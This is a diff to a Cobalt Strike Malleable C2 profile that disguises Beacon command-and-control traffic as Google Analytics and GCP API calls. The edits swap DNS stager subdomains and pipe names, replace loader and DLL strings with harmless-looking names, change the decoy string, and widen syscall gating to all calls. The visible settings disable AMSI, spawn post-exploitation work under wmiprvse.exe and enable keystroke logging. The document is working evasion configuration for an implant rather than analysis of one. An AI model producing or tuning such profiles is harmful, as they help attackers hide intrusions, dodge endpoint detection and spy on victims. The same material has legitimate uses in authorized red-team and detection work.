@@ -1,6 +1,9 @@
 # Malleable C2 Profile - Google Analytics theme
 # CS 4.13 / Beacon Booster compatible
+# Sub-profile of reference_mod_413.profile (Azure Function redirector baseline)
 # Simulates Google Analytics and GCP API traffic
+
+# Various options
 
 set sample_name "Google Analytics Beacon";
 set data_jitter "64";
@@ -14,13 +17,18 @@ set ssh_banner "OpenSSH_9.3p1 Debian-1";
 set sleeptime "30000";
 set jitter "42";
 
-set ssh_pipename "postex_ssh_####";
+set killdate "20260916";
+
+set ssh_pipename "gtag_ssh_####";
 set tcp_frame_header "";
 set tcp_port "8080";
 
 set headers_remove "";
+
 set steal_token_access_mask "11";
+
 set tasks_proxy_max_size "94371840";
+
 set tasks_dns_proxy_max_size "71680";
 
 dns-beacon {
@@ -29,7 +37,7 @@ dns-beacon {
     set dns_max_txt "252";
     set dns_sleep "0";
     set dns_stager_prepend "";
-    set dns_stager_subhost ".stage.123456.";
+    set dns_stager_subhost ".api.947103.";
     set dns_ttl "1";
 
     set beacon         "api.bc.";
@@ -187,6 +195,11 @@ http-beacon {
     set data_required_length "256-512";
 }
 
+# ------------------------------------------------------------
+# BASELINE HARDENING - matches reference_mod_413.profile
+# See references/profile-baseline.md before editing.
+# ------------------------------------------------------------
+
 stage {
 
     set checksum "0";
@@ -199,6 +212,8 @@ stage {
     set rdll_dripload_delay    "100";
 
     # Beacon Booster compatible: no transform-obfuscate, no prepend/append in stage transforms
+
+    # Separation knob: theme-matching strrep replacements
     transform-x86 {
         strrep "ReflectiveLoader" "CatalogUpdate";
         strrep "beacon.x64.dll" "corelib.dll";
@@ -211,7 +226,8 @@ stage {
         strrep "beacon.dll" "gacutil.dl";
     }
 
-    stringw "I am not Beacon";
+    # Separation knob: theme-matching decoy string
+    stringw "Google Analytics Beacon";
 
     set allocator "VirtualAlloc";
     set cleanup "true";
@@ -221,12 +237,13 @@ stage {
     set syscall_method "Indirect";
 
     beacon_gate {
-      Comms;
+      All;
     }
 
     set stomppe "true";
     set userwx "false";
 
+    # Separation knobs: varied per profile
     set compile_time "25 Mar 2024 14:22:00";
     set entry_point "81440";
 
@@ -245,6 +262,7 @@ process-inject {
     set bof_allocator "VirtualAlloc";
     set bof_reuse_memory "true";
 
+    # Separation knob: 2 NOPs (baseline)
     transform-x86 {
         prepend "\x90\x90";
     }
@@ -264,11 +282,15 @@ process-inject {
 }
 
 post-ex {
+    # Separation knob: unique spawnto per profile
     set spawnto_x86 "%windir%\\syswow64\\wmiprvse.exe -Embedding";
     set spawnto_x64 "%windir%\\sysnative\\wmiprvse.exe -Embedding";
 
     set obfuscate "true";
+
+    # Separation knob: unique post-ex pipe per profile
     set pipename "chrome_###, chrome.####.###.#";
+
     set smartinject "true";
     set amsi_disable "true";
     set keylogger "GetAsyncKeyState";
